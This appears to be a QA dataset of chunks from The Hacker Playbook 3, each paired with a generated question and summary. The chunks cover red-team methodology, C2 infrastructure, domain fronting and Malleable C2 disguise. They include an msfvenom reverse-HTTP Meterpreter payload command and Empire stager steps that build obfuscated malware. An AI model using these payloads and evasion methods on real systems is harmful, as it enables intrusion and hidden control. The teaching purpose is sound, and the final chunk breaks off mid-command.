[
  {
    "start": 1,
    "end": 3,
    "text": "preface\nThis is the third iteration of The Hacker Playbook (THP) series. Below is an\noverview of all the new vulnerabilities and attacks that will be discussed. In\naddition to the new content, some attacks and techniques from the prior books\n(which are still relevant today) are included to eliminate the need to refer back to\nthe prior books. So, what's new? Some of the updated topics from the past\ncouple of years include:\nAbusing Active Directory\nAbusing Kerberos\nAdvanced Web Attacks\nBetter Ways to Move Laterally\nCloud Vulnerabilities\nFaster/Smarter Password Cracking\nLiving Off the Land\nLateral Movement Attacks\nMultiple Custom Labs\nNewer Web Language Vulnerabilities\nPhysical Attacks\nPrivilege Escalation\nPowerShell Attacks\nRansomware Attacks\nRed Team vs Penetration Testing\nSetting Up Your Red Team Infrastructure\nUsable Red Team Metrics\nWriting Malware and Evading AV\nAnd so much more\nAdditionally, I have attempted to incorporate all of the comments and\nrecommendations received from readers of the first and second books. I do want\nto reiterate that I am not a professional author. I just love security and love\nteaching security and this is one of my passion projects. I hope you enjoy it.\nThis book will also provide a more in-depth look into how to set up a lab\nenvironment in which to test your attacks, along with the newest tips and tricks\nof penetration testing. Lastly, I tried to make this version easier to follow since\nmany schools have incorporated my book into their curricula. Whenever\npossible, I have added lab sections that help provide a way to test a vulnerability\nor exploit.\nAs with the other two books, I try to keep things as realistic, or “real world”, as\npossible. I also try to stay away from theoretical attacks and focus on what I\nhave seen from personal experience and what actually worked. I think there has\nbeen a major shift in the industry from penetration testers to Red Teamers, and I\nwant to show you rather than tell you why this is so. As I stated before, my\npassion is to teach and challenge others. So, my goals for you through this book\nare two-fold: first, I want you to get into the mindset of an attacker and\nunderstand “the how” of the attacks; second, I want you to take the tools and\ntechniques you learn and expand upon them. Reading and repeating the labs is\nonly one part – the main lesson I teach to my students is to let your work speak\nfor your talents. Instead of working on your resume (of course, you should have\na resume), I really feel that having a strong public Github repo/technical blog\nspeaks volumes in security over a good resume. Whether you live in the blue\ndefensive or red offensive world, getting involved and sharing with our security\ncommunity is imperative.\nFor those who did not read either of my two prior books, you might be\nwondering what my experience entails. My background includes more than 12\nyears of penetration testing/red teaming for major financial institutions, large\nutility companies, Fortune 500 entertainment companies, and government\norganizations. I have also spent years teaching offensive network security at\ncolleges, spoken at multiple security conferences, been referenced in many\nsecurity publications, taught courses all over the country, ran multiple public\nCTF competitions, and started my own security school. One of my big passion\nproject was building a free and open security community in Southern California\ncalled LETHAL (meetup.com/lethal). Now, with over 800+ members, monthly\nmeetings, CTF competitions, and more, it has become an amazing environment\nfor people to share, learn, and grow.\nOne important note is that I am using both commercial and open source tools.\nFor every commercial tool discussed, I try to provide an open source\ncounterpart. I occasionally run into some pentesters who claim they only use\nopen source tools. As a penetration tester, I find this statement hard to accept. If\nyou are supposed to emulate a “real world” attack, the “bad guys” do not have\nthese restrictions; therefore, you need to use any tool (commercial or open\nsource) that will get the job done.\nA question I get often is, who is this book intended for? It is really hard to state\nfor whom this book is specifically intended as I truly believe anyone in security\ncan learn. Parts of this book might be too advanced for novice readers, some\nparts might be too easy for advanced hackers, and other parts might not even be\nin your field of security.\nFor those who are just getting into security, one of the most common things I\nhear from readers is that they tend to gain the most benefit from the books after\nreading them for the second or third time (making sure to leave adequate time\nbetween reads). There is a lot of material thrown at you throughout this book\nand sometimes it takes time to absorb it all. So, I would say relax, take a good\nread, go through the labs/examples, build your lab, push your scripts/code to a\npublic Github repository, and start up a blog.\nLastly, being a Red Team member is half about technical ability and half about\nhaving confidence. Many of the social engineering exercises require you to\novercome your nervousness and go outside your comfort zone. David Letterman\nsaid it best, \"Pretending to not be afraid is as good as actually not being afraid.\"\nAlthough this should be taken with a grain of salt, sometimes you just have to\nhave confidence, do it, and don't look back.\nNotes and Disclaimer\nI can't reiterate this enough: Do not go looking for vulnerable servers and\nexploits on systems you don't own without the proper approval. Do not try to do\nany of the attacks in this book without the proper approval. Even if it is for\ncuriosity versus malicious intent, you can still get into a lot of trouble for these\nactions. There are plenty of bug bounty programs and vulnerable sites/VMs to\nlearn off of in order to continue growing. Even for some bug bounty programs,\nbreaking scope or going too far can get you in trouble:\nhttps://www.forbes.com/sites/thomasbrewster/2015/12/17/facebook-\ninstagram-security-research-threats/#c3309902fb52\nhttps://nakedsecurity.sophos.com/2012/02/20/jail-facebook-ethical-\nhacker/\nhttps://www.cyberscoop.com/dji-bug-bounty-drone-technology-sean-\nmelia-kevin-finisterre/\nIf you ever feel like it's wrong, it's probably wrong and you should ask a lawyer\nor contact the Electronic Frontier Foundation (EFF)\n(https://www.eff.org/pages/legal-assistance). There is a fine line between\nresearch and illegal activities.\nJust remember, ONLY test systems on which you have written permission. Just\nGoogle the term “hacker jailed” and you will see plenty of different examples\nwhere young teens have been sentenced to years in prison for what they thought\nwas a “fun time.” There are many free platforms where legal hacking is allowed\nand will help you further your education.\nFinally, I am not an expert in Windows, coding, exploit dev, Linux, or really\nanything else. If I misspoke about a specific technology, tool, or process, I will\nmake sure to update the Hacker Playbook Updates webpage\n(thehackerplaybook.com/updates) for anything that is reported as incorrect.\nAlso, much of my book relies on other people's research in the field, and I try to\nprovide links to their original work whenever possible. Again, if I miss any of\nthem, I will update the Updates webpage with that information. We have such\nan awesome community and I want to make sure everyone gets acknowledged\nfor their great work!\nintroduction\nIn the last engagement (The Hacker Playbook 2), you were tasked with breaking\ninto the Cyber Kittens weapons facility. They are now back with their brand\nnew space division called Cyber Space Kittens (CSK). This new division took\nall the lessons learned from the prior security assessment to harden their\nsystems, set up a local security operations center, and even create security\npolicies. They have hired you to see if all of their security controls have helped\ntheir overall posture.\nFrom the little details we have picked up, it looks like Cyber Space Kittens has\ndiscovered a secret planet located in the Great Andromeda Nebula or\nAndromeda Galaxy. This planet, located on one of the two spiral arms, is\nreferred to as KITT-3n. KITT-3n, whose size is double that of Earth, resides in\nthe binary system called OI 31337 with a star that is also twice the size of\nEarth’s star. This creates a potentially habitable environment with oceans, lakes,\nplants, and maybe even life…\nWith the hope of new life, water, and another viable planet, the space race is\nreal. CSK has hired us to perform a Red Team assessment to make sure they are\nsecure, and capable of detecting and stopping a breach. Their management has\nseen and heard of all the major breaches in the last year and want to hire only the\nbest. This is where you come in...\nYour mission, if you choose to accept it, is to find all the external and internal\nvulnerabilities, use the latest exploits, use chained vulnerabilities, and see if their\ndefensive teams can detect or stop you.\nWhat types of tactics, threats, and procedures are you going to have to employ?\nIn this campaign, you are going to need to do a ton of reconnaissance and\ndiscovery, look for weaknesses in their external infrastructure, social engineer\nemployees, privilege escalate, gain internal network information, move laterally\nthroughout the network, and ultimately exfiltrate KITT-3n systems and\ndatabases.",
    "question": "What is the main purpose of the Red Team assessment conducted by the Cyber Space Kittens division?",
    "summary": "The third edition of The Hacker Playbook covers new vulnerabilities and attacks, including cloud security, privilege escalation, and ransomware, while also including relevant techniques from previous books. It provides in-depth lab setups and real-world insights to help readers understand and apply attack methods effectively. The book aims to teach readers the mindset of an attacker and encourages them to share their work publicly through GitHub and blogs rather than just relying on a resume."
  },
  {
    "start": 4,
    "end": 6,
    "text": "Penetration Testing Teams vs Red Team s\nBefore we can dive into the technical ideals behind Red Teams, I need to clarify\nmy definitions of Penetration Testing and Red Teams. These words get thrown\naround often and can get a little mixed up. For this book, I want to talk about\nhow I will use these two terms.\nPenetration Testing is the more rigorous and methodical testing of a network,\napplication, hardware, etc. If you haven’t already, I recommend that you read\nthe Penetration Testing Execution Standard (PTES: http://www.pentest-\nstandard.org) – it is a great walkthrough of how to perform an assessment. In\nshort, you go through all the motions of Scoping, Intel Gathering, Vulnerability\nAnalysis, Exploitation, Post Exploitation, and Reporting. In the traditional\nnetwork test, we usually scan for vulnerabilities, find and take advantage of an\nexploitable system or application, maybe do a little post exploitation, find\ndomain admin, and write up a report. These types of tests create a matrix of\nvulnerabilities, patching issues, and very actionable results. Even during the\nscope creation, penetration tests are very well defined, limited to a one or two-\nweek assessment period, and are generally announced to the company’s internal\nsecurity teams. Companies still need penetration testers to be a part of their\nsecure software development life cycle (S-SDLC).\nNowadays, even though companies have vulnerability management programs, S-\nSDLC programs, penetration testers, incident response teams/programs, and\nmany of the very expensive security tools, they still get compromised. If we\nlook at any of the recent breaches\n(http://www.informationisbeautiful.net/visualizations/worlds-biggest-data-\nbreaches-hacks), we see that many of these happened to very large and mature\ncompanies. We have seen in other security reports that some compromises\ncould have lasted longer than 6 months before they were detected\n(https://en.wikipedia.org/wiki/Sony_Pictures_hack). There are also some reports\nthat state that almost one-third of all businesses were breached in 2017\n(https://www.esecurityplanet.com/network-security/almost-a-third-of-all-u.s.-\nbusinesses-were-breached-in-2017.html). The questions I want companies to\nask are if these exact same bad guys or actor sets came after your company with\nthe exact same tactics, could you detect it, how long would it take, could you\nrecover from it, and could you figure out exactly what they did?\nThis is where Red Teams come into play. The Red Team’s mission is to emulate\nthe tactics, techniques, and procedures (TTPs) by adversaries. The goals are to\ngive real world and hard facts on how a company will respond, find gaps within\na security program, identify skill gaps within employees, and ultimately increase\ntheir security posture.\nFor Red Teams, it is not as methodical as penetration tests. Since we are\nsimulating real world events, every test can differ significantly. Some\ncampaigns might have a focus on getting personally identifiable information\n(PII) or credit cards, while others might focus on getting domain administrative\ncontrol. Speaking of domain admin, this where I see a huge difference between\nPenetration Tests and Red Team campaigns. For network pentests, we love\ngetting to Domain Admin (DA) to gain access to the Domain Controller (DC)\nand calling it a day. For Red Team campaigns, based on the campaign, we may\nignore the DC completely. One reason for this is that we are seeing many\ncompanies placing a lot of protection around their DCs. They might have\napplication whitelisting, integrity monitoring, lots of IDS/IPS/HIPS rules, and\neven more. Since our mission is not to get caught, we need to stay low key.\nAnother rule we follow is that we almost never run a vulnerability scan against\nthe internal network. How many adversaries have you seen start to perform full\nvulnerability scans once inside a compromised environment? This is extremely\nrare. Why? Vulnerability scans are very loud on the network and will most\nlikely get caught in today’s world.\nAnother major difference in the scope is the timeline. With penetration tests, we\nare lucky to get two weeks, if not one. Whereas, Red Teams must build\ncampaigns that last from 2 weeks to 6 months. This is because we need to\nsimulate real attacks, social engineering, beaconing, and more. Lastly, the\nlargest difference is the outcome of the two types of teams. Instead of a list of\nvulnerabilities, Red Team findings need to be geared more toward gaps in blue\nteam processes, policies, tools, and skills. In your final report, you may have\nsome vulnerability findings that were used for the campaign, but most findings\nwill be gaps in the security program. Remember findings should be mainly for\nthe security program, not IT.\nPenetration Tests Red Teams\nMethodical Security Assessments: Flexible Security Assessments:\nPre-engagement Intelligence Gathering\nInteractions Initial Foothold\nIntelligence Gathering Persistence/Local\nVulnerability Analysis Privilege Escalation\nExploitation Local/Network\nPost Exploitation Enumeration\nReporting Lateral Movement\nData\nIdentification/Exfiltration\nDomain Privilege\nEscalation/Dumping\nHashes\nReporting\nScope: Scope:\nRestrictive Scope No Rules*\n1-2 Week Engagement 1 Week – 6 Month\nGenerally Announced Engagement\nIdentify vulnerabilities No announcement\nTest Blue teams on\nprogram, policies, tools,\nand skills\n*Can’t be illegal…\nWith Red Teams, we need to show value back to the company. It isn’t about the\nnumber of total vulnerability counts or criticality of individual vulnerabilities; it\nis about proving how the security program is running. The goal of the Red Team\nis to simulate real world events that we can track. Two strong metrics that\nevolve from these campaigns are Time To Detect (TTD) and Time To Mitigate\n(TTM). These are not new concepts, but still valuable ones for Red Teams.\nWhat does Time To Detect (TTD) mean? It is the time between the initial\noccurrence of the incident to when an analyst detects and starts working on the\nincident. Let’s say you have a social engineering email and the user executes\nmalware on their system. Even though their AV, host-based security system, or\nmonitoring tools might trigger, the time recorded is when the analyst creates that\nfirst ticket.\nTime To Mitigate (TTM) is the secondary metric to record. This timeline is\nrecorded when the firewall block, DNS sinkhole, or network isolation is\nimplemented. The other valuable information to record is how the Security\nTeams work with IT, how management handles a critical incident, and if\nemployees panic. With all this data, we can build real numbers on how much\nyour company is at risk, or how likely it is to be compromised.\nSummary\nThe big push I want to make is for managers to get outside the mentality of\nrelying on metrics from audits. We all have reasons for compliance and they can\ndefinitely help mature our programs, but they don't always provide real world\nsecurity for a company. As Red Teamers, our job is to test if the overall security\nprogram is working.\nAs you read through this book, I want you to put yourself in the Red Team\nmindset and focus on:\nVulnerabilities in Security not IT\nSimulate Real World events\nLive in a world of constant Red Team infections\nChallenge the system… Provide real data to prove security gaps.\n1 pregame - the setup\nAs a Red Team, we don’t really care as much about the origins of an attack.\nInstead, we want to learn from the TTPs. For example, looking at public\nsources, we found a detailed report from FireEye on an attack they analyzed\n(https://www2.fireeye.com/rs/848-DID-242/images/rpt-apt29-hammertoss.pdf).\nReviewing their analysis, we can see that the TTPs of the malware used Twitter\nas part of the Command and Control (C2), images with encryption keys, GitHub,\nand steganography. This is where we would build a similar campaign to see if\nyour company could detect this attack.\nA detailed breakdown for APT attacks is MITRE’s Adversarial Tactics,\nTechniques, and Common Knowledge (ATT&CK) matrix. This is a large\ncollection of different TTPs commonly used with all sorts of attacks.\nAnother resource is this running list of APT Groups and Operations document\nfrom @cyb3rops. This Google Document (http://bit.ly/2GZb8eW) breaks down\ndifferent suspected APT groups and their toolsets. This is a useful list for us as\nRed Teamers to simulate different attacks. Of course, we might not use the same\ntools as documented in the reports, but we may build similar tools that will do\nthe same thing.",
    "question": "What is the main difference between Penetration Testing and Red Team activities in terms of their objectives, methods, and outcomes?",
    "summary": "Penetration testing is a structured method to identify vulnerabilities in a system, typically within a short timeframe and announced to security teams. Red Teams, on the other hand, simulate real-world attacks to test how a company's security program responds, focusing on gaps in processes, policies, and employee skills rather than just technical vulnerabilities. Red Teams aim to provide real-world metrics like Time To Detect and Time To Mitigate to better assess a company's actual security risk."
  },
  {
    "start": 7,
    "end": 9,
    "text": "Assumed Breach Exercises\nCompanies need to live in a world today where they start with the assumption\nthat they have already been breached. These days, too many companies assume\nthat because of some check box or annual penetration test, they are secure. We\nneed to get in a state of mind where we are always hunting, assuming evil is\nlurking around, and looking for these anomalies.\nThis is where Red Team campaigns heavily differ from penetration tests. Since\nRed Team campaigns focus on detection/mitigation instead of vulnerabilities, we\ncan do some more unique assessments. One assessment that provides\ncustomers/clients with immense benefit is called an assumed breach exercise. In\nan assumed breach exercise, the concept is that there will always be 0-days. So,\ncan the client identify and mitigate against secondary and tertiary steps?\nIn these scenarios, Red Teams work with a limited group of people inside the\ncompany to get a single custom malware payload to execute on their server.\nThis payload should try to connect out in multiple ways, make sure to bypass\ncommon AV, and allow for additional payloads to be executed from memory.\nWe will have example payloads throughout the book. Once the initial payload is\nexecuted, this is where all the fun begins!\nSetting Up Your Campaign\nThis is one of my favorite parts of running Red Teams. Before you compromise\nyour first system, you need to scope out your Red Team campaign. In a lot of\npenetration tests, you are given a target and you continually try to break into that\nsingle system. If something fails, you go on to the next thing. There is no script\nand you are usually pretty focused on that network.\nIn Red Team campaigns, we start out with a few objectives. These objectives\ncan include, but are not limited to:\nWhat are the end goal goals? Is it just APT detection? Is it to get a\nflag on a server? Is it to get data from a database? Or is it just to get\nTTD metrics?\nIs there a public campaign we want to copy?\nWhat techniques are you going to use? We talked about using\nMITRE ATT&CK Matrix, but what are the exact techniques in each\ncategory?\nThe team at Red Canary supplied detailed information on\neach one of these techniques. I highly recommend you\ntake time and review them all: http://bit.ly/2H0MTZA\nWhat tools does the client want you to use? Will it be COTS\noffensive tools like Metasploit, Cobalt Strike, DNS Cat? Or custom\ntools?\nThe best part is that getting caught is part of the assessment. There are some\ncampaigns where we get caught 4 or 5 times and have to burn 4 or 5 different\nenvironments. This really shows to your client that their defenses are working\n(or not working) based on what results they expected. At the end of the book, I\nwill provide some reporting examples of how we capture metrics and report that\ndata.\nSetting Up Your External Servers\nThere are many different services that we use for building our campaigns. In\ntoday's world with the abundance of Virtual Private Servers (VPS), standing up\nyour attacker machines on the internet won't break your budget. For example, I\ncommonly use Digital Ocean Droplets\n(https://www.digitalocean.com/products/compute) or Amazon Web Services\n(AWS) Lightsail servers (https://lightsail.aws.amazon.com) to configure my\nVPS servers. The reasons I use these services are because they are generally\nvery low cost (sometimes free), allow for Ubuntu servers, allow for servers in all\nsorts of regions, and most importantly, are very easy to set up. Within minutes,\nyou can have multiple servers set up and running Metasploit and Empire\nservices.\nI am going to focus on AWS Lightsail servers in this book, due to the ease in\nsetting up, ability to automate services, and the amount of traffic normally going\nto AWS. After you have fully created an image you like, you can rapidly clone\nthat image to multiple servers, which makes it extremely easy to build ready-\nmade Command and Control boxes.\nAgain, you should make sure you abide by the VPS provider's service terms (i.e.\nhttps://aws.amazon.com/service-terms/) so you do not fall into any problems.\nhttps://lightsail.aws.amazon.com/\nCreate an Instance\nI highly recommend getting at least 1 GB of RAM\nStorage space usually isn't an issue\nLinux/Unix\nOS Only -> Ubuntu\nDownload Cert\nchmod 600 cert\nssh -i cert ubuntu@[ip]\nOnce you are logged into your server, you need to install all the tools as\nefficiently and repeatable as possible. This is where I recommend that you\ndevelop your own scripts to set up things such as IPTables rules, SSL certs,\ntools, scripts, and more. A quick way to build your servers is to integrate\nTrustedSec's The PenTesters Framework (PTF). This collection of scripts\n(https://github.com/trustedsec/ptf) does a lot of the hard work for you and creates\na framework for everything else. Let's walk through a quick example of\ninstalling all of our exploitation, intel gathering, post exploitation, PowerShell,\nand vulnerability analysis tools.\nsudo su -\napt-get update\napt-get install python\ngit clone https://github.com/trustedsec/ptf optptf\ncd optptf && ./ptf\nuse modules/exploitation/install_update_all\nuse modules/intelligence-gathering/install_update_all\nuse modules/post-exploitation/install_update_all\nuse modules/powershell/install_update_all\nuse modules/vulnerability-analysis/install_update_all\ncd /pentest\nThe following image shows all the different modules available, some of which\nwe installed.\nImage of all available modules\nIf we take a look at our attacker VPS, we can see all of the tools installed on our\nbox. If we wanted to start up Metasploit, we can just type: msfconsole.\nAll tools installed under /pentest\nOne thing I still recommend is setting up strong IPTables rules. Since this will\nbe your attacker server, you will want to limit where SSH authentications can\ninitiate from, where Empire/Meterpreter/Cobalt Strike payloads can come from,\nand any phishing pages you stand up.\nIf you remember back in late 2016, someone had found an unauthenticated\nRemote Code Execution (RCE) on Cobalt Strike Team Server\n(https://blog.cobaltstrike.com/2016/09/28/cobaltstrike-rce-active-exploitation-\nreported/). You definitely don't want your attacker servers compromised with\nyour customer's data.\nI have also seen some Red Teams run Kali Linux (or at least Metasploit) in\nDocker inside AWS (http://bit.ly/2qz2vN9). From my point of view, there is no\nwrong way to create your systems. What you do want is to create an efficient\nand repeatable process to deploy multiple machines. The best part of using\nLightsail is that once you have your machine configured to your preferences,\nyou can take a snapshot of a machine and stand up multiple, brand new instances\nof that image.\nIf you want to get your environment to the next level, check out the team at\nCoalfire-Research. They built custom modules to do all the hard work and\nautomation for you. Red Baron is a set of modules and custom/third-party\nproviders for Terraform, which tries to automate the creation of resilient,\ndisposable, secure, and agile infrastructure for Red Teams\n[https://github.com/Coalfire-Research/Red-Baron]. Whether you want to build a\nphishing server, Cobalt Strike infrastructure, or create a DNS C2 server, you can\ndo it all with Terraform.\nTake a look at https://github.com/Coalfire-Research/Red-Baron and check out\nall the different modules to quickly build your own infrastructure.",
    "question": "What is an assumed breach exercise and how does it differ from traditional penetration tests in the context of Red Team campaigns?",
    "summary": "Assumed Breach Exercises involve companies assuming they have already been breached to test their detection and mitigation capabilities. Unlike traditional penetration tests, Red Team campaigns focus on simulating real-world attacks with custom malware that bypasses security measures. The book covers setting up Red Team campaigns, using AWS Lightsail for efficient and repeatable server configurations, and integrating tools like Metasploit and the PenTesters Framework for comprehensive attack simulations."
  },
  {
    "start": 10,
    "end": 17,
    "text": "Tools of the Trade\nThere are a myriad of tools a Red Team might use, but let’s talk about some of\nthe core resources. Remember that as a Red Teamer, the purpose is not to\ncompromise an environment (which is the most fun), but to replicate real world\nattacks to see if a customer is protected and can detect attacks in a very short\ntimeframe. In the previous chapters, we identified how to replicate an attacker's\nprofile and toolset, so let’s review over some of the most common Red Team\ntools.\nMetasploit Framework\nThis book won't dive too deeply into Metasploit as it did in the prior books.\nMetasploit Framework is still a gold standard tool even though it was originally\ndeveloped in 2003. This is due to both the original creator, H.D. Moore, and the\nvery active community that supports it. This community-driven framework\n(https://github.com/rapid7/metasploit-framework/commits/master), which seems\nto be updated daily, has all of the latest public exploits, post exploitation\nmodules, auxiliary modules, and more.\nFor Red Team engagements, we might use Metasploit to compromise internal\nsystems with the MS17-010 Eternal Blue Exploit (http://bit.ly/2H2PTsI) to get\nour first shell or we might use Metasploit to generate a Meterpreter payload for\nour social engineering attack.\nIn the later chapters, we are going to show you how to recompile your\nMetasploit payloads and traffic to bypass AV and network sensors.\nObfuscating Meterpreter Payloads\nIf we are performing some social engineering attack, we might want to use a\nWord or Excel document as our delivery mechanism. However, a potential\nproblem is that we might not be able to include a Meterpreter payload binary or\nhave it download one from the web, as AV might trigger on it. Also, a simple\nsolution is obfuscation using PowerShell:\nmsfvenom --payload windows/x64/meterpreter_reverse_http --format\npsh --out meterpreter-64.ps1 LHOST=127.0.0.1\nWe can even take this to the next level and use tools like Unicorn\n(https://github.com/trustedsec/unicorn) to generate more obfuscated PowerShell\nMeterpreter payloads, which we will be covered in more detail as we go through\nthe book.\nAdditionally, using signed SSL/TLS certificates by a trusted authority could help\nus get around certain network IDS tools: https://github.com/rapid7/metasploit-\nframework/wiki/Meterpreter-Paranoid-Mode.\nFinally, later in the book, we will go over how to recompile\nMetasploit/Meterpreter from scratch to evade both host and network based\ndetection tools.\nCobalt Strike\nCobalt Strike is by far one of my favorite Red Team simulation tools. What is\nCobalt Strike? It is a tool for post exploitation, lateral movement, staying hidden\nin the network, and exfiltration. Cobalt Strike doesn't really have exploits and\nisn't used for compromising a system via the newest 0-day vulnerability. Where\nyou really see its extensive features and powers is when you already have code\nexecution on a server or when it is used as part of a phishing campaign payload.\nOnce you can execute a Cobalt Strike payload, it creates a Beacon connection\nback to the Command and Control server.\nNew Cobalt Strike licenses cost $3,500 per user for a one-year license, so it is\nnot a cheap tool to use. There is a free limited trial version available.\nCobalt Strike Infrastructure\nAs mentioned earlier, in terms of infrastructure, we want to set up an\nenvironment that is reusable and highly flexible. Cobalt Strike supports\nredirectors so that if your C2 domain is burned, you don't have to spin up a\nwhole new environment, only a new domain. You can find more on using socat\nto configure these redirectors here: http://bit.ly/2qxCbCZ and\nhttp://bit.ly/2IUc4Oe.\nTo take your redirectors up a notch, we utilize Domain Fronting. Domain\nFronting is a collection of techniques to make use of other people’s domains and\ninfrastructures as redirectors for your controller (http://bit.ly/2GYw55A). This\ncan be accomplished by utilizing popular Content Delivery Networks (CDNs)\nsuch as Amazon’s CloudFront or other Google Hosts to mask traffic origins.\nThis has been utilized in the past by different adversaries\n(http://bit.ly/2HoCRFi).\nUsing these high reputation domains, any traffic, regardless of HTTP or HTTPS,\nwill look like it is communicating to these domains instead of our malicious\nCommand and Control servers. How does this all work? Using a very high-\nlevel example, all your traffic will be sent to one of the primary Fully Qualified\nDomain Names (FQDNs) for CloudFront, like a0.awsstatic.com, which is\nCloudFront's primary domain. Modifying the host header in the request will\nredirect all the traffic to our CloudFront distribution, which will ultimately\nforward the traffic to our Cobalt Strike C2 server (http://bit.ly/2GYw55A).\nBy changing the HTTP Host header, the CDN will happily route us to the correct\nserver. Red Teams have been using this technique for hiding C2 traffic by using\nhigh reputation redirectors.\nTwo other great resources on different products that support Domain Fronting:\nCyberArk also wrote an excellent blog on how to use Google App\nproducts to look like your traffic is flowing through\nwww.google.com, mail.google.com, or docs.google.com here:\nhttp://bit.ly/2Hn7RW4.\nVincent Yiu wrote an article on how to use Alibaba CDN to support\nhis domain fronting attacks: http://bit.ly/2HjM3eH.\nCobalt Strike isn't the only tool that can support Domain Fronting,\nthis can also be accomplished with Meterpreter\nhttps://bitrot.sh/post/30-11-2017-domain-fronting-with-meterpreter/.\nNote: At the time of publishing this book, AWS (and even Google) have starting\nimplementing protections against domain fronting (https://amzn.to/2I6lSry).\nThis doesn't stop this type of attack, but would require different third party\nresources to abuse.\nAlthough not part of the infrastructure, it is important to understand how your\nbeacons work within an internal environment. In terms of operational security,\nwe don’t want to build a campaign that can be taken out easily. As a Red\nTeamer, we have to assume that some of our agents will be discovered by the\nBlue Team. If we have all of our hosts talking to one or two C2 endpoints, it\nwould be pretty easy to take out our entire infrastructure. Luckily for us, Cobalt\nStrike supports SMB Beacons between hosts for C2 communication. This\nallows you to have one compromised machine communicate to the internet, and\nall other machines on the network to communicate through the initial\ncompromised host over SMB (https://www.cobaltstrike.com/help-smb-beacon).\nThis way, if one of the secondary systems is detected and forensics analysis is\nperformed, they might not be able to identify the C2 domain associated with the\nattack.\nA neat feature of Cobalt Strike that immensely helps Red Teams is its ability to\nmanipulate how your Beacons communicate. Using Malleable C2 Profiles, you\ncan have all your traffic from your compromised systems look like normal\ntraffic. We are getting into more and more environments where layer 7\napplication filtering is happening. In layer 7, they are looking for anomalous\ntraffic that many times this is over web communication. What if we can make\nour C2 communication look like normal web traffic? This is where Malleable\nC2 Profiles come into play. Take a look at this example:\nhttps://github.com/rsmudge/Malleable-C2-\nProfiles/blob/master/normal/amazon.profile. Some immediate notes:\nWe see that these are going to be HTTP requests with URI paths:\nset uri \"sref=nb_sb_noss_1/167-3294888-0262949/field-\nkeywords=books\";\nThe host header is set to Amazon:\nheader \"Host\" \"www.amazon.com\";\nAnd even some custom Server headers are sent back from the C2\nserver\nheader \"x-amz-id-1\" \"THKUYEZKCKPGY5T42PZT\";\nheader \"x-amz-id-2\"\n\"a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=\";\nNow that these have been used in many different campaigns, numerous security\ndevices have created signatures on all of the common Malleable Profiles\n(https://github.com/rsmudge/Malleable-C2-Profiles). What we have done to get\naround this is to make sure all the static strings are modified, make sure all\nUserAgent information is changed, configure SSL with real certificates (don't\nuse default Cobalt Strike SSL certificates), use jitter, and change beacon times\nfor the agents. One last note is to make sure the communication happens over\nPOST (http-post) commands as failing to do so may cause a lot of headache in\nusing custom profiles. If your profile communicates over http-get, it will still\nwork, but uploading large files will take forever. Remember that GET is\ngenerally limited to around 2048 characters.\nThe team at SpectorOps also created Randomized Malleable C2 Profiles using:\nhttps://github.com/bluscreenofjeff/Malleable-C2-Randomizer.\nCobalt Strike Aggressor Scripts\nCobalt Strike has numerous people contributing to the Cobalt Strike project.\nAggressor Script is a scripting language for Red Team operations and adversary\nsimulations inspired by scriptable IRC clients and bots. Its purpose is two-fold:\n(1) You may create long running bots that simulate virtual Red Team members,\nhacking side-by-side with you, (2) you may also use it to extend and modify the\nCobalt Strike client to your needs [https://www.cobaltstrike.com/aggressor-\nscript/index.html]. For example, HarleyQu1nn has put together a great list of\ndifferent aggressor scripts to use with your post exploitation:\nhttp://bit.ly/2qxIwPE.\nPowerShell Empire\nEmpire is a post-exploitation framework that includes a pure-PowerShell2.0\nWindows agent, and a pure Python 2.6/2.7 Linux/OS X agent. It is the merge of\nthe previous PowerShell Empire and Python EmPyre projects. The framework\noffers cryptologically-secure communications and a flexible architecture. On the\nPowerShell side, Empire implements the ability to run PowerShell agents\nwithout needing powershell.exe, rapidly deployable post-exploitation modules\nranging from key loggers to Mimikatz, and adaptable communications to evade\nnetwork detection, all wrapped up in a usability-focused framework\n[https://github.com/EmpireProject/Empire].\nFor Red Teamers, PowerShell is one of our best friends. After the initial\npayload, all subsequent attacks are stored in memory. The best part of Empire is\nthat it is actively maintained and updated so that all the latest post-exploitation\nmodules are available for attacks. They also have C2 connectivity for Linux and\nOS X. So you can still create an Office Macro in Mac and, when executed, have\na brand new agent in Empire.\nWe will cover Empire in more detail throughout the book so you can see how\neffective it is. In terms of setting up Empire, it is very important to ensure you\nhave configured it securely:\nSet the CertPath to a real trusted SSL certificate.\nChange the DefaultProfile endpoints. Many layer 7 firewalls look\nfor the exact static endpoints.\nChange the User Agent used to communicate.\nJust like Metasploit's rc files used for automation in the prior books, Empire now\nsupports autorun scripts for efficiency and effectiveness.\nRunning Empire:\nStarting up Empire\ncd optEmpire && ./setup/reset.sh\nExit\nexit\nSetup Up Cert (best practice is to use real trusted certs)\n./setup/cert.sh\nStart Empire\n./empire\nStart a Listener\nlisteners\nPick your listener (we'll use http for our labs)\nuselistener [tab twice to see all listener types]\nuselistener http\nView all configurations for the listener\ninfo\nSet the following (i.e. set KillDate 12/12/2020):\nKillDate - The end of your campaign so your agents\nautocleanup\nDefaultProfile - Make sure to change all the endpoints (i.e.\nadminget.php,/news.php). You can make them up\nhowever you want, such as seriouslynotmalware.php\nDefaultProfile - Make sure to also change your User\nAgent. I like to look at the top User Agents used and pick\none of those.\nHost - Change to HTTPS and over port 443\nCertPath - Add your path to your SSL Certificates\nUserAgent - Change this to your common User Agent\nPort - Set to 443\nServerVersion - Change this to another common Server\nHeader\nWhen you are all done, start your listener\nexecute\nConfiguring the Payload\nThe payload is the actual malware that will run on the victim's system. These\npayloads can run in Windows, Linux, and OSX, but Empire is most well-known\nfor its PowerShell Windows Payloads:\nGo to the Main menu\nmain\nCreate stager available for OSX, Windows, Linux. We are going to\ncreate a simple batfile as an example, but you can create macros for\nOffice files or payloads for a rubber ducky\nusestager [tab twice to see all the different types]\nusestager windows/launcher_bat\nLook at all settings\ninfo\nConfigure All Settings\nset Listener http\nConfigure the UserAgent\nCreate Payload\ngenerate\nReview your payload in another terminal window\ncat tmplauncher.bat\nAs you can see, the payload that was created was heavily obfuscated. You can\nnow drop this .bat file on any Windows system. Of course, you would probably\ncreate an Office Macro or a Rubber Ducky payload, but this is just one of many\nexamples.\nIf you don't already have PowerShell installed on your Kali image, the best way\nto do so is to install it manually. Installing PowerShell on Kali:\napt-get install libunwind8\nwget http://security.debian.org/debian-\nsecurity/pool/updates/main/o/openssl/libssl1.0.0_1.0.1t-\n1+deb7u3_amd64.deb\ndpkg -i 